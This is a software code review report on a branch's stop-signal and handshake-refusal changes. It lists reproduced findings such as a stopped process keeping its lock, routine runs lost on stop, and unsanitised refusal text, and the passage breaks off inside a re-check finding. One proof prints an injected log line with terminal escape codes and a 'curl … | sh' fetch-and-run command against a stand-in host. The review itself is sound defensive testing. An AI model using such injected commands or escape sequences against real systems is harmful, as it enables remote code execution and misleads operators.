# A.19 review, 2026-11-12: the stop signal and the refusal with a reason

Reviewed: `fix/A.19-stop-and-refusal` at `5add735` (`git diff f13b3dd..HEAD`:
`229cc1d`, `d193f86`, `5add735`). Read in full, then attacked on the branch's
own build (a copy of the binary, since the shared target is rebuilt by other
branches). No product or test source changed; only this report and the
scripts under `crates/cli/tests/support/review_a19/` were added. Machine: Arch
Linux, kernel 7.2.15, bubblewrap 0.13.1, `fusermount3` setuid, the repository
on a rotational USB disk. systemd and Docker were not run (rules of this
machine); claim 5 is reasoned from systemd's documentation. Format and
severity scale as in `2026-11-T8e-guard.md`.

The builder's tests pass here: `stop_signal` 5 of 5, `version_refusal` 3 of
3, `runtime` `a_stop_closes_the_running_turn_and_refuses_new_work`.

## 1. Verdict

**The handshake part holds. The stop holds on the paths the tests walk and
breaks on five others; claim 4 (routines) is not true as written and has no
test.**

What held, with proof: a stranger never learns a version, in any shape of the
new field, with equal timing; a refused handshake does not touch the node's
live link; each kind of turn in flight (model call, sub-agent, approval,
chat runtime, shell) ends `stopped` once, written by its own store, and the
next start adds nothing; a command that ignores SIGTERM or detaches is gone
before exit 0; 192 prompts and 40 approval answers raced against the signal
produced no accepted-and-lost prompt, no turn left open by an exit 0 and no
command run after the stop; a second signal exits in 3 ms and the next start
closes exactly the open turn, once; a stop with the master away replays the
end once; another user sees the same 404 for the owner's chat before and
during the stop.

What did not hold:

| Id | Severity | What | Proof |
|---|---|---|---|
| A19-1 | **Medium** (claims 2 and 3) | After "stopped: every turn is closed" the process does not exit while one of its own blocking threads is stuck (a file tool on a mount that stopped answering). It has already released the data directory's lock, its port is closed, and SIGTERM and SIGINT no longer do anything. A second `serve` starts on the same data directory beside it. | `stop_hang_blocking.py` |
| A19-2 | **Medium** (claim 4; no test exists) | A routine's run cut by a stop is finished `interrupted`, which counts as a failure: five stops pause the routine. A run accepted while the server stops ("run now", a webhook) is answered 202, "retried" only in memory, and ended `interrupted`, "never retried", at the next start. | `routine_stops.py`, `stop_users_routines.py` |
| A19-3 | **Low** (claim 2) | One command of the agent makes every stop take the whole 60 s and end with exit 1 and the turn `interrupted`: the after-turn checkpoint does not see the cancel, and its own limit (60 s) equals the stop's. | `stop_bound.py` |
| A19-4 | **Low** (claim 2) | `node run`: a restore that passed the refusal but has not registered its folder is not seen by the stop. The node exits 0 in 0.2 s with the restore cut, nothing recorded; the caller gets 504 after 15 s. 10 of 10 with the signal 11 to 59 ms after the request. | `restore_race.py` |
| A19-5 | **Low** (claim 2) | When the log cannot be written (full disk) the stop exits 0 and logs "every turn is closed" with the turn's end not in the log. | `stop_full_disk.py` |
| A19-6 | **Low** (claim 1) | The `rejected` reason reaches the node's stderr raw and whole: escape sequences, a forged line in the node's own log shape, 7 MiB. | `review_a19_node_reason.rs` |
| A19-7 | **Low** (claims 1, 5, 6; not run) | The README's unit has `Restart=always`, `RestartSec=5`: a refused node "exits instead of trying again" and is started again every 5 s for ever. A refusal has no exit status of its own to exclude. | reading |
| A19-8 | **Low** (claim 2, the refusal's text) | "send this again once it is back": a refused message with an attachment cannot be sent again, the upload was spent before the node was asked. | `stop_window.py` |
| N-1 to N-12 | Note | start-up, two signals at once, what exit 0 leaves, the absent version, a malformed version, the protocol number, wrong ends, the approval select, commands not refused, the master's log, the tests, the documents | sections 3 to 5 |

Asked for before merge: A19-1 (a few lines in `main`, and its test), A19-2
(either the code or the sentences), A19-5 and A19-4 (a few lines each).
A19-3 is a constant or a bounded snapshot; A19-6 is one function; A19-7 and
A19-8 are a line of unit and a line of text unless the owner wants more.

## 2. Findings

All scripts: `crates/cli/tests/support/review_a19/<name>` (Python 3, no
packages), each starting the real binary on its own data directory under
`<target>/review_a19/run-<pid>/` and a port the kernel picks. Run with
`CARGO_TARGET_DIR` set as for the build; `RIZZY=<binary>` names another
binary. The two Rust proofs run through `run_rust_proofs.sh handshake|reason`,
which copies one file into its crate's `tests/` for the run and removes it.

### A19-1. Medium. A stopped process that does not exit, without its lock, deaf to signals

**Breaks.** Claim 2 ("the process then exits 0"; "the wait is bounded";
"a second signal exits at once") and claim 3 ("none after the process has
released the data-directory lock"; `lock.rs`: "until the process ends").

**Mechanism.** `main` (`cli/src/main.rs:1115-1118`) runs `async_main` on a
runtime built in the same expression. `_lock` is a local of `async_main`
(`:1145`), so the lock file is closed when `async_main` returns; the runtime
is dropped after that, and dropping a tokio runtime waits without limit for
blocking threads that are running. The agent loop abandons a tool 5 s after a
cancel and says itself that "a blocking thread it left keeps running
detached" (`agent-native/src/lib.rs:1888`). The second-signal task and the
signal streams died with the runtime, but the handlers tokio installed stay:
SIGTERM and SIGINT are caught and go nowhere.

**Reproduction.** `python3 stop_hang_blocking.py` (the node's `read` tool on
`fuse_stall.py`'s file, the guard tests' server, unchanged):

```
the node's read tool is waiting in a read of <run>/hang/ws/mnt/stall
5.3 s after SIGTERM the log says: rizzy_harness: stopped: every turn is closed
exit status 15 s later: None (None: still running), process state 'S'
the data directory's lock can be taken by someone else now: True
its HTTP port answers: no (URLError: <urlopen error [Errno 111] Connection refused>)
after one more SIGTERM: exit status None
after one more SIGINT: exit status None
a second `serve` on the same data directory started (pid 2699593) while pid 2698991 is alive [S]; the session's log: … 8:checkpoint 9:turn_ended(stopped)
the second one stops with exit status 0
the mount is released: the first process now ends with exit status 0
```

**Reach.** Not found from inside a contained command (`ls /dev/fuse` there:
"No such file or directory"; the file tools open FIFOs non-blocking,
`tools/src/lib.rs:58`). It is the accident: a
session folder on NFS, sshfs or FUSE whose server went away, which is when an
operator restarts the node. Under the README's unit systemd kills it at 90 s
and records a failed stop. By hand, Ctrl-C does nothing more and the next
`serve` runs beside a live process whose abandoned tool threads still act on
the session folder when the mount comes back. On `f13b3dd` the same hang
followed a Ctrl-C (not run there; same `main`), and SIGTERM ended it; now
only SIGKILL does.

**Smallest fix.** Hold the lock in `main`, outside the runtime, and end the
runtime with a limit: `let rt = …build()?; let r = rt.block_on(…);
rt.shutdown_timeout(Duration::from_secs(1));` with the lock dropped after it
(or `std::process::exit` with the status once `async_main` returned).

**Test.** `stop_signal.rs`, with `fuse_stall.py` as `guard.rs` mounts it:
`read: mnt/stall`, SIGTERM, the process has exited within 15 s; and until it
has, the lock cannot be taken.

### A19-2. Medium. A stop fails a routine's run for good and counts against the routine

**Breaks.** Claim 4, both halves. README `:1282-1284`: "a routine that
falls due waits for the server's next start or retries the node later (it is
not blocked)". `docs/node-update.md` §7.0: "routines retry".

**Mechanism.** (a) `finalize` maps `stopped` to the run status `interrupted`
(`runner.rs:1193`); `counted` takes `interrupted` as a failure (`:842`);
`MAX_FAILURES = 5` in a row pause the routine. (b) Only `tick` looks at
`is_stopping()` (`:139`). "Run now" and a webhook delivery still admit a run
while the server stops; the local runtime refuses with `NODE_STOPPING`;
`launch_failed` calls `retry_later` (`:731`), which queues the retry in
memory for one minute later; the process exits within that minute; the next
start's `reconcile` ends every `pending` run as `interrupted` ("never
retried", `:1203`, `:1217`), again a failure. For `serve`'s own runtimes the
retry A.19 added can never run.

**Reproduction.** `python3 routine_stops.py` (a chat routine whose turn is
running at each of five SIGTERMs, every exit 0):

```
stop 1: exit 0; the run: interrupted, 'the node was stopped while the turn ran'; routine: consecutive_failures, paused_reason = (1, None)
stop 2: … (2, None)
stop 3: … (3, None)
stop 4: … (4, None)
stop 5: exit 0; the run: interrupted, 'the node was stopped while the turn ran'; routine: consecutive_failures, paused_reason = (5, 'failures')
stop 6: run now -> 409 {'error': 'this routine is paused (failures); turn it on again first'}
```

`python3 stop_users_routines.py` (second half; "run now" 0.2 s into a stop):

```
routine, run now, while stopping: 202 {'run_id': '01a1d1dac00c733bb484c17aa3a101e7'}
exit status 0
after the next start, the routine's runs:
  status interrupted, attempt 2, reason 'the server restarted before the run started'
65 s later (past the 1 min retry): [('interrupted', 'the server restarted before the run started')]
```

**Reach.** A long routine scheduled at the hour of a nightly restart; N.9's
updates restart nodes on purpose. No attacker is needed; a webhook's sender
can add pending runs during a stop.

**Smallest fix.** A run ended by a stop gets a status `counted` does not
count (as `cancelled` is not), or is put back to due; `run_now` and the
webhook path answer 503 while `is_stopping()`; a `pending` run found at
start whose last reason was the stop is launched, not ended. Or the
sentences in README, PLAN and §7.0 say what happens.

**Test.** `master/tests/routines_http.rs`: a run whose turn ends `stopped`
leaves `consecutive_failures` at 0; "run now" after `begin_stop()` is 503
and adds no run.

### A19-3. Low. One command makes every stop last 60 s and end as a failure

**Breaks.** Claim 2: the attacker's "delay the exit past the bound, make the
stop record a wrong end". The bound itself holds (60.6 s).

**Mechanism.** `run_turn` takes the after-turn checkpoint before it writes
the end (`session.rs:695-698`); the snapshot does not look at the cancel and
has its own limit, `SNAPSHOT_TIMEOUT = 60 s` (`git.rs:107`), the same as
`STOP_WAIT` (`stop.rs:25`), and it starts after the cancel. `stop.rs` says
the checkpoint "took up to 15.5 s on a slow disk"; a sparse file makes it as
long as one likes at no disk cost.

**Reproduction.** `python3 stop_bound.py` (the turn runs
`truncate -s 60G big; sleep <n>`):

```
the command made a sparse 60G file (0 bytes on disk) and sleeps
0.0 s after SIGTERM the command is gone
exit status 1, 60.6 s after SIGTERM
    Error: stopped after 60 s with 1 turn(s) still running (sessions 01a1d1f6-…): the next start closes them as interrupted
alive right after the exit: nothing
next start: ends ['interrupted']; 6:tool_call_started 7:tool_call_finished 8:error(The node restarted while this turn was running. …) 9:turn_ended(interrupted)
```

The command was killed in the first 100 ms; the 60 s are the node's own git.
The turn loses its `after` checkpoint and cannot be restored, as after a
crash. This is the first run that reaches the bound: no test of the branch
does.

**Smallest fix.** While the node stops, give the after-turn snapshot what is
left of the stop's wait minus a margin (or skip it and say so in the
`checkpoint` event); or derive `STOP_WAIT` from its parts
(`TOOL_CANCEL_GRACE + SNAPSHOT_TIMEOUT` + margin) and move `TimeoutStopSec`
and the Docker text with it.

**Test.** This script as a test: exit 0 and `stopped` with a folder whose
snapshot takes longer than the stop.

### A19-4. Low. `node run` exits 0 through a restore it accepted

**Breaks.** Claim 2 ("a restore … is refused"); `NodeRuntime::stop`'s own
comment ("waits for every turn and restore to end").

**Mechanism.** `handle` checks the flag (`node/src/lib.rs:689`), then the
restore writes its audit row, reads the log and opens the checkpoint
repository before `claim_folder` registers it (`session.rs:1120`). `stop`
sets the flag and looks once (`lib.rs:956`): no turn, no registered restore,
return. `prompt` closes the same window by checking again after its claim
(`session.rs:491`); the restore does not. `serve` is covered by accident: the
restore's HTTP request holds the 30 s grace open.

**Reproduction.** `python3 restore_race.py 10` (a real `serve --node-listen`
and `node run`; the restore is made slow by a sparse file so the outcomes
differ in time):

```
try 0, SIGTERM 24.3 ms after the request: node exit 0 in 0.2 s; caller: 504 {'error': 'node did not answer in time'} (15.0 s); file.txt: two; node's audit rows for the restore: 1; checkpoint events: ['before', 'after'] -> cut
… (10 lines alike, 11.6 to 58.7 ms)
outcomes: {'cut': 10}
```

Control, `restore_race.py 2 8G 1500` (the signal after it registered):

```
try 0, SIGTERM 1500.0 ms after the request: node exit 0 in 11.0 s; caller: 200 {'ok': True} (12.2 s); file.txt: (removed: restored); … ['before', 'after', 'before_restore', 'after', 'restored'] -> waited
```

Here the cut fell in the restore's first snapshot, so the folder was
untouched. With an ordinary folder the 200 ms the node gives itself can end
inside the file writes; the `before_restore` checkpoint then makes it
recoverable (A.16), as after a kill.

**Smallest fix.** In `claim_folder`, under the registry's lock, refuse with
`NODE_STOPPING` when the flag is set (the flag is set before `stop` takes
that lock, so one of the two sees the other).

**Test.** `node/tests/runtime.rs`: `stop` called between the restore's
`handle` and its claim (a test hook, or 200 restores against 200 stops):
every restore is either refused or finished before `stop` returns.

### A19-5. Low. Exit 0 and "every turn is closed" with the end not written

**Breaks.** The question "does exit 0 ever happen with a turn not closed":
yes. Claim 2's "recorded as `stopped`".

**Mechanism.** `end_turn` sets `unclosed` when the end cannot be appended and
frees the slot (`session.rs:760`); `stop` asks only `is_running()`.

**Reproduction.** `python3 stop_full_disk.py` (file size limit 0 set on the
script's own server once its turn runs; SIGXFSZ ignored: every write fails):

```
exit status 0, 0.2 s after SIGTERM; the log's last lines:
    ERROR harness_node::session: could not write the session log; stopping the turn session=01a1d1ee-… error=sqlite: disk I/O error
    INFO rizzy_harness: stopped: every turn is closed
the command is gone: True
next start: ends ['interrupted']; … 7:error(The node restarted while this turn was running. …) 8:turn_ended(interrupted)
```

**Smallest fix.** `stop` returns the sessions whose `unclosed` is set with
those still running; `stopped()` names them and exits 1.

**Test.** `node/tests/runtime.rs` with the store that fails appends (the
log-failure tests have one): `stop` returns the session.

### A19-6. Low. What a master can write on a node's terminal

**Breaks.** Claim 1 where it tells the operator to read the reason; the
attacker "a master that lies to a node".

**Mechanism.** `node_handshake` returns `LinkError::Rejected(reason)` as
received; `main` prints the error with `{:?}` of anyhow, which does not
escape. The link's frame limit is the only bound.

**Reproduction.** `sh run_rust_proofs.sh reason` (a stand-in master with the
right certificate, the real `node run`):

```
exit status Some(1) after 104.534995ms; stderr, escaped:
    Error: rejected: x\u{1b}[2J\u{1b}[H\n
    2026-11-12T00:00:00.000000Z  INFO rizzy_harness: update verified; run: curl https://example.invalid/fix | sh\u{7}\r\n
ESC bytes written raw to the node's stderr: 2; a line that starts as the node's own log lines do: true
a reason of 65536 bytes: exit status Some(1) after 106.2443ms, 66848 bytes on stderr
a reason of 1048576 bytes: exit status Some(1) after 105.25848ms, 1049888 bytes on stderr
a reason of 7340032 bytes: exit status Some(1) after 196.816526ms, 7341344 bytes on stderr
```

A master can already ask the node for anything inside `node.toml`; this is
outside it: the node owner's terminal and journal. The printed line also
does not say who refused (`.context("the link to the master")` at
`main.rs:844` is on the task's join, not on the link's error).

**Smallest fix.** Where the reason is received: drop control characters,
cut at a few hundred characters (the master's `clean_label` does this for a
node's strings), and print "the master refused this node: …".

**Test.** This proof with asserts: no byte below 0x20 except the final
newline, at most N characters.

### A19-7. Low. The README's unit starts a refused node again every 5 s

**Breaks.** Claim 1 ("exits non-zero instead of reconnecting") as the README
states it (`:1271`: "exits with that message instead of trying again") under
the README's own unit (`:1346-1347`). Not run.

**Reasoning.** `Restart=always` restarts after any exit that is not a
`systemctl stop`. A refused node lives about 0.1 s (A19-6's times), so one
start per 5.1 s: under the default start limit (5 starts in 10 s), so for
ever. Each start is one handshake, one WARN on the master (no limit, no
audit row) and one error on the node. That is what the row called
"reconnects forever", now with the reason. The refusal exits 1 like every
other error, so the unit cannot exclude it.

**Smallest fix.** A status of its own for "refused by the master" (§7.0
already reserves 75 and 76) and `RestartPreventExitStatus=<it>` in the unit;
or the README says the unit keeps trying every 5 s and how to stop it.

**Test.** `a_node_refused_for_its_version_exits_with_the_reason` asserts the
status.

### A19-8. Low. "Send this again" does not work for a message with a file

**Breaks.** The refusal's fixed text.

**Mechanism.** The prompt handler takes (deletes) the uploads before it asks
the node (`master/src/http.rs:1219`); the node refuses; nothing puts them
back. The same was true for an absent node before A.19; the new text is what
promises otherwise.

**Reproduction.** `python3 stop_window.py`:

```
  prompt with the attachment         -> 503 {'error': 'this node is stopping (…): send this again once it is back'}
after the next start:
  the refused prompt, sent again     -> 400 {'error': 'unknown or already used attachment; upload it again'}
```

**Smallest fix.** Put the uploads back when the node answers
`NodeStopping`, `NodeOffline` or `Timeout`; or take them only after the ack.

**Test.** `master/tests`: a prompt with an attachment to a stopping node,
then the same prompt again, is accepted.

## 3. Notes

- **N-1. A stop signal during start-up is not a stop.** `Signals::install`
  runs after all start-up work, so until then SIGTERM kills (as before).
  `signals.py startup` (a data directory with a turn left open by a kill):
  SIGTERM 0 to 120 ms after `exec`: status -15; from 160 ms: exit 0. A kill
  between the two appends of `recover_interrupted` leaves an `error` without
  its end, and each such start adds another: the full start after sixteen
  tries showed `7:error(The node restarted…) 8:error(…) 9:error(…)
  10:turn_ended(interrupted)`. One end, three messages. Not new; the window
  grows with the number of open sessions. As PID 1 (Docker) a signal before
  the handler exists is dropped, not fatal: not run here.
- **N-2. Two signals in the same instant are one.** `signals.py twice`:
  SIGTERM twice back to back, ten runs: `0 in 2.57 s` ten times (the stop,
  not the forced exit). tokio merges them. No person types that fast.
- **N-3. What exit 0 can leave.** `stop_commands.py stuck`: a command in a
  read the kernel cannot interrupt: `exit status 0 2.7 s after SIGTERM`,
  its guard alive until the mount answered; the tool result says so, the
  stop's last line ("every turn is closed") does not. `stop_commands.py off`
  (`contain = "off"`): `alive 5 s later: sleep 975415` after a clean exit 0;
  `stop.rs` says it, the README's stop section ("it and everything it
  started are killed", "Nothing is left running") does not.
- **N-4. "No version is protocol 1" is compatibility code** by `CLAUDE.md`'s
  rule, five lines. A required field is simpler. It breaks: the one test
  that writes the hello without it (`a_hello_without_a_version_is_protocol_1`,
  which would become "is closed without an answer"), and a node built before
  A.19, which would get no reason (N-5), on data that the same rule says is
  wiped. Nothing else: `client.rs` is the only place that builds
  `Hello::Auth`, and the embedded node does not use the wire handshake. Take
  the default out or get the owner's yes.
- **N-5. A version of the wrong type is answered with a closed socket**, for
  the node's own key and a stranger alike (`the_fields_shapes`: `-1`, `1.0`,
  `"1"`, `null`, 2^32, a field given twice). So a future build that changes
  the field's type is back to "retries for ever without a reason"; and a
  stranger can tell an A.19 master from an older one (which ignored the
  field and answered "unknown or revoked node"). One bit, no version.
- **N-6. `PROTOCOL_VERSION` is still 1** though the hello gained a field and
  `turn_ended` a value. An older master with this node shows "turn stopped"
  unstyled and ends a routine's run as `error`; an older node binary on this
  data directory cannot fold a log that holds `stopped`. Before the first
  tag that is allowed; it is also exactly what the new check exists to name.
- **N-7. Wrong ends, by reading (not proven).** A turn the user cancelled
  just before the signal, and a turn that completed and is in its
  after-turn checkpoint when the signal comes, both end `stopped`
  (`session.rs:702-707`: the flag is read when the end is written).
- **N-8. The approval wait is an unbiased `select!`** (`session.rs:1854-1860`):
  an "allow" that arrives after the cancel and before the task is polled can
  win. `stop_race.py approvals 40`: 24 recorded `allow by user` (each at or
  before the stop's log line to the millisecond), 15 answered 409, 1 denied;
  the command ran in 0 of 40. Not proven; `biased;` with the cancel first
  closes it.
- **N-9. Not refused while stopping:** `set_agent` and `select_variant`
  append to a session's log after the stop began (reading; written by the
  session's own actor). A node of another protocol can still `node join`
  (the token is spent, the key registered) and is refused at `node run`.
- **N-10. The master's log.** A version refusal is one WARN per handshake,
  with the node's registered id and two numbers; no audit row and no limit.
  Only a holder of a registered key can cause it. Nothing an unauthenticated
  peer sends reaches a log line that did not exist before.
- **N-11. Tests** (by reading; `f13b3dd` was not built). Fail on `f13b3dd`
  and test the claim: `a_protocol_mismatch_is_refused_before_accepted_with_the_reason`;
  four of `stop_signal.rs`; the `runtime.rs` one. Pass on `f13b3dd` too:
  `a_hello_without_a_version_is_protocol_1` (the old master accepted any
  hello), `an_unauthenticated_peer_does_not_learn_the_version` (a guard for
  the order, good to have) and
  `a_node_refused_for_its_version_exits_with_the_reason` (every `rejected`
  already ended the loop; the master is a stand-in, so no test joins the
  real refusal to the real exit). No test: the bound and exit 1 (A19-3
  reaches it); claim 4 at all; a refused restore or stage; `node run`'s
  second signal; a stop with the link down; the lock at exit.
- **N-12. Documents.** Beyond A19-2, A19-7 and N-3: `PLAN.md` and the
  README say the lock "is released by the kernel" and "stays locked while a
  stop waits", true during the wait, not at the end (A19-1).
  `docs/node-update.md` §7.0 lists what is left to N.9 correctly.

## 4. Per question: what was tried and what it showed

Outputs are the scripts' own lines, cut at `…`; where several lines say the
same they are drawn into one (the handshake table, `stop_commands.py`,
`stop_window.py`).

**The handshake.** `sh run_rust_proofs.sh handshake` (three tests against a
real `Master::serve_nodes`):

```
protocol_version       | the node's own key                        | a stranger's key (the node's id | an unknown id)
absent                 | {"type":"accepted","node_id":"box"}       | unknown or revoked node | unknown or revoked node
1                      | accepted                                  | same | same
0                      | rejected "this node speaks protocol 0 and…" | same | same
2                      | rejected "this node speaks protocol 2 and…" | same | same
u32::MAX               | rejected "this node speaks protocol 42949…" | same | same
u32::MAX+1, -1, 1.0, 1e400, "1", null, [1], 2000 digits, twice, a 1 MiB string
                       | closed without an answer                  | closed | closed
a second handshake claiming 2: rejected … ; claiming 0: rejected …
after two refused handshakes with its key, the live link is still up: true
auth says 1, node.hello says 2: the master then sends Ok(Ok(None)); listed as connected: false
claim (none)  median 42.07 ms; claim 1  median 42.03 ms; claim 99  median 42.12 ms   (40 each, a stranger)
```

The comparison is after `identity::verify` on the only path that has it
(`auth`); `join` carries no version; the refusal returns before
`remote_stops.insert`, so a superseded connection is not cancelled by a
refused one. The reason holds two integers and the crate version, nothing
from the peer.

**Each kind of work in flight.** `python3 stop_kinds.py`, read from
`node.db` and `chat.db` after the exit:

```
exit status 0, 2.6 s after SIGTERM
  node.db  1 model call          started 1, ends ['stopped'], seq contiguous True
  node.db  2 sub-agent (parent)  started 1, ends ['stopped'], seq contiguous True
  node.db  @scout: slow: 120000  started 1, ends ['stopped'], seq contiguous True
  node.db  4 approval            started 1, ends ['stopped'], approvals ['deny by cancelled'], seq contiguous True
  chat.db  5 chat runtime        started 1, ends ['stopped'], seq contiguous True
  node.db  6 shell               started 1, ends ['stopped'], seq contiguous True
the next start added nothing to any log: True
```

A file tool: A19-1. A restore: A19-4. A routine's run: A19-2. A web tool:
not tested, the fetch of this script's own silent server on 127.0.0.1 was
refused by the tool before the stop (`ends ['completed']`), and no other
machine may be contacted.

**Processes after the exit.** `python3 stop_commands.py`:

```
[term]   exit status 0 2.6 s after SIGTERM; alive right after the exit: nothing; tool result: [cancelled: the command and everything it started were killed; its guard confirmed the end (2001 ms)]
[detach] exit status 0 0.6 s; nothing; … confirmed the end (0 ms)
[many]   exit status 0 3.3 s; nothing; three sessions, each ['stopped']
[stuck]  exit status 0 2.7 s; alive: the guard, until the mount was released (N-3)
[off]    exit status 0 2.7 s; alive 5 s later: sleep 975415 (N-3)
```

**The refusal window.** `python3 stop_window.py` (0.26 s into a stop):
prompt 503, new session 503 (no row left: listed 5 before, 4 after the
delete), restore 503, `allow` 409 "no such pending approval", cancel 200,
delete 200, events 200; exit 0; `must-not-exist` absent; the approval
`deny by cancelled`. `python3 stop_race.py prompts 8` (192 prompts sent 150 ms
before to 20 ms after the signal):

```
  answered 200, turns started 1, ends ['stopped']: 19
  answered 503, turns started 0, ends []: 173
violations: 0
```

**Another user.** `python3 stop_users_routines.py`: six requests against the
owner's running chat and against an id that does not exist, before and
during the stop: 24 answers, all `404 unknown session`, `answers that
differ: 0`. `visible_session` runs before any node is asked in every handler.

**The second signal and the bound.** `python3 signals.py second`:

```
SIGTERM, then SIGINT 0.5 s later: exit status 1 0.003 s after the second; alive right after: 4 process(es)
alive 5 s later: nothing
next start, quick : ends ['stopped']
next start, slow  : ends ['interrupted']
third start, quick : ends ['stopped'];  third start, slow : ends ['interrupted']
```

The bound: A19-3. SIGHUP and SIGQUIT (`signals.py hup quit`): status -1 and
-3, nothing alive 6 s later, the turn `interrupted` once: unchanged, a crash.

**The link down.** `python3 node_link.py`:

```
1. the server, its remote node mid-turn: exit status 0 in 0.4 s; the node's command is still running: True
2. the node, its server away: exit status 0 in 0.4 s; its command is gone: True
3. the server alone again: ends []; last seq 6;   a prompt to that chat meanwhile: 503 'node <id> is not connected'
4. the node back: ends ['stopped']; seqs once and in order: True; … 9:turn_ended(stopped)
   a new turn runs after it: 200; ends ['stopped', 'completed']
```

**A full disk.** A19-5.

**The new reason in every reader.** Node fold and store: typed, `Stopped`
added. Master: keeps events raw; `finalize` maps it (A19-2). Web: the type,
the string and the style were added; `Conversation.tsx:552` prints `turn
{reason}` for any value. No other reader was found (`git grep` for the
other reasons' names in `crates` and `web/src`: routines and the UI only).
The value is a
Rust enum on the node; nothing the model or the user writes reaches it, the
refusal text is a constant, the version reason is two integers.

**Not tested, and why.** systemd and Docker (rules); a web tool in flight
(above); a stop exactly inside one append (the races above are the nearest);
`f13b3dd`'s behaviour in A19-1 (not built; same `main`); N-7 and N-8.

## 5. Verdict per claim

1. **Holds on the wire** (order, reason, stranger, exit status non-zero).
   What the operator then sees is unsanitised (A19-6) and the README's unit
   undoes "instead of reconnecting" (A19-7). "No version is protocol 1" is
   compatibility code (N-4).
2. **Holds on the tested paths; five holes:** no exit with a stuck thread
   (A19-1), the bound reachable by one command with a wrong end (A19-3), a
   restore cut on `node run` (A19-4), exit 0 with an unwritten end (A19-5),
   "send this again" false with a file (A19-8).
3. **Holds during the wait; not at the end:** the lock is released before
   the process is gone, for as long as a blocking thread lives (A19-1). Every
   event of a stopping turn was written by its own store, once.
4. **Does not hold.** A stop fails the run it cuts and counts toward the
   pause; a run taken during the stop is lost as `interrupted` (A19-2). The
   scheduler does start nothing while stopping (reading). No test.
5. **`KillMode=mixed`, `TimeoutStopSec=90`, no `KillSignal` do what the
   README says for a stop** (reasoned; 60 s + 2 s + 0.2 s < 90 s for a node).
   `Restart=always` beside it contradicts the paragraph above the unit
   (A19-7). Not run.
6. **§7.0 and the N.9 split are accurate.** Three sentences claim more than
   is built: routines (A19-2), "nothing is left running" (N-3), "exits
   instead of trying again" under the unit (A19-7).

## 6. Left clean

Every script kills what it started by pid and prints `cleanup killed: …`
(`nothing` in every run reported here). After the last run: no process with
`review_a19` in its command line or working directory, no `sleep 97xxxx` to
`98xxxx`, no line with `review_a19` or `t8e-stall` in `/proc/self/mountinfo`.
The owner's server was never signalled and its data directory never opened.

## 7. Re-check, 2026-11-13: the fixes of `859e59c`

Re-checked: the branch at `13b8cde` (`git diff 421f43c..HEAD`: `859e59c` the
fixes, `5eeca5c` the documents, `13b8cde` a message; `421f43c` is a merge of
`origin/main` and not the subject). Same machine, same rules, the branch's
own build (a copy of it). No product or test source changed. The builder's
tests pass here: `stop_signal` 10 of 10. The proofs of sections 2 to 4 were
run again; two were rewritten to say what is true now
(`stop_hang_blocking.py`, `routine_stops.py`), `review_a19_handshake.rs` and
`review_a19_node_reason.rs` were extended, and six are new
(`routine_remote.py`, `review_a19_put_back_loop.rs`, `stop_child_race.py`,
`stop_ends.py`, `uploads_race.py`, `debug_seam.py`). The Rust proofs now keep
their temporary folders under the target directory (`run_rust_proofs.sh`
sets `TMPDIR`); in the first round and in the first two runs of this one
they were made in `/tmp` by `tempfile`, as the suite's own tests make
theirs, and removed when each test ended.

### 7.1 Status

| Id | Status | What shows it |
|---|---|---|
| A19-1 | **Closed**, with the limit the builder states | `stop_hang_blocking.py`: the leader is a zombie, one thread in `D`, until the read returns; the lock cannot be taken; a second `serve` is refused; reaped with 0 once the mount answers. Notes R-9. |
| A19-2 | **Partly closed.** A run cut by a stop of `serve` is put back, not counted, and runs once at the next start (five stops: failures 0, one run, six chats). "Run now" and webhooks: 503, no run. Four paths still lose or distort a run: **R-1, R-2, R-3, R-4** | `routine_stops.py`, `routine_remote.py`, `review_a19_put_back_loop.rs` |
| A19-3 | **Closed** for what was tried: a 60 GB sparse file: exit 0 after 61.1 s, `stopped`; a 40 GB one in a git repository (the snapshot succeeds in 58 s, then the copies): exit 0 after 59.0 s. By reading, what follows a snapshot that succeeded late (`pin_turn`, `prune`, a collection's hold, each git call up to 120 s) has the 15 s margin; not made to exceed it. | `stop_bound.py`, `stop_bound.py 40G repo` |
| A19-4 | **Closed.** 10 of 10 restores racing the node's stop (10 to 56 ms): 503 in 0.1 s, nothing cut. | `restore_race.py 10` |
| A19-5 | **Closed.** Exit 1, the session named. A panic of the stop task is still read as "nothing left": R-10. | `stop_full_disk.py` |
| A19-6 | **Partly closed.** The refusal: one line, 148 characters, no ESC; 7 MiB becomes 1635 bytes of stderr. Still raw: the node id a master assigns at `node join`: **R-5**. What `printable` lets through: **R-6**. | `run_rust_proofs.sh reason` |
| A19-7 | **Closed** (the unit by reading). `node run` and `node join` exit 77 on a refusal; nothing else in `serve` or `node` can (`main` looks for `LinkError::Rejected` in the error's chain; only `node_handshake` makes one). | `run_rust_proofs.sh reason` |
| A19-8 | **Closed.** The refused message, sent again: 200. Two side effects: R-8. | `stop_window.py`, `uploads_race.py` |
| N-1 | Open (not claimed fixed): a signal before the handlers are installed still kills. | |
| N-2 | Open (not claimed fixed), harmless. | |
| N-3 | **Closed** in the documents: the README now names both leftovers. | reading |
| N-4 | **Closed.** The field is required; a hello without it is closed without an answer. | `the_fields_shapes` |
| N-5 | Open by design: a malformed or missing version gets a closed socket and no reason. A node built before the field now gets that too. | `the_fields_shapes` |
| N-6 | Open (not claimed fixed): the protocol number is still 1. | |
| N-7 | **Partly closed.** Cancel then stop: `cancelled`. A completed turn in its checkpoint: `completed`. A sub-agent being started when the stop comes ends `cancelled`: **R-7**. | `stop_ends.py`, `stop_child_race.py` |
| N-8 | **Closed** (`biased`, the cancel first). Raced again: section 7.3. | `stop_race.py approvals` |
| N-9 | **Closed** for the join (refused with the reason, token unspent) and for sub-agents (refused; but see R-7). `set_agent` and `select_variant` still append while stopping, judged harmless by the builder; I agree. The join's check is an oracle for a token: R-11. | `what_a_join_of_another_protocol_tells_about_its_token` |
| N-10 | Open (not claimed fixed); one more WARN, for a refused join with a valid token. | |
| N-11 | **Mostly closed**: tests now reach the bound (through the debug seam), the stuck thread, the node's second signal, the link down, the join. None for R-1 to R-4. | |
| N-12 | **Closed** except the three sentences R-1 to R-3 make untrue, and R-9. | |

### 7.2 New findings

#### R-1. Medium (claim 4; made by the fix). A put-back run of a webhook is run again without its event

**Mechanism.** Both relaunch paths call `spawn_execute(m, run_id, None)`
(`runner.rs:1251`, `:1272`). `admit` takes the event only from that
argument; the copy on the run's row (`routine_runs.event`) is not read. The
prompt is rendered again with no event: every `{{event.…}}` is empty
(`on_missing = empty`, the default) or the run is `skipped`
(`on_missing = skip`); the run is no longer marked untrusted; the source's
consent check in `admit` is skipped.

**Reproduction.** `python3 routine_stops.py webhook` (a webhook routine
